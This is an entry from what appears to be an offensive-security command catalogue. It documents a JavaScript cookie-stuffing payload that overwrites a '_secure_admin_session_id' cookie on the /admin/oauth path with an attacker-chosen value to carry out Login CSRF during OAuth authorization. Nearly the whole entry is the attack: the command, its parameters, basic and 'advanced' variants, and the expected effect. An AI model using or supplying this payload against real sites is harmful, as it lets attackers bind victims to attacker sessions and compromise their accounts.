---
data: document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
tags:
  - cookie-stuffing
type: command
executor: javascript
platforms:
  - Web
id: 0950e114-c28b-4d5f-986d-db244e4b617a
created_at: '2025-12-13T23:56:03.988Z'
updated_at: '2025-12-13T23:56:03.988Z'
verified: false
validated: true
submitted: true
---
# Set Secure Admin Session ID Cookie

## Command

```javascript
document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
```

## Description

Sets a cookie for _secure_admin_session_id with a specific path to stuff an evil session ID, enabling Login CSRF during OAuth authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `_secure_admin_session_id` | EVIL session ID | Yes |
| `path` | /admin/oauth to override broader paths | Yes |

## Examples

### Basic Usage

```javascript
document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
```

### Advanced Usage

```javascript
document.cookie = '_secure_admin_session_id=MALICIOUS;path=/admin/oauth;secure';
```

## Expected Output

Sets the cookie in the browser, overriding existing ones.

## Related

- [[procedures/Perform-Cookie-Stuffing-for-Login-CSRF]]
- [[commands/set-master-udr-cookie]]
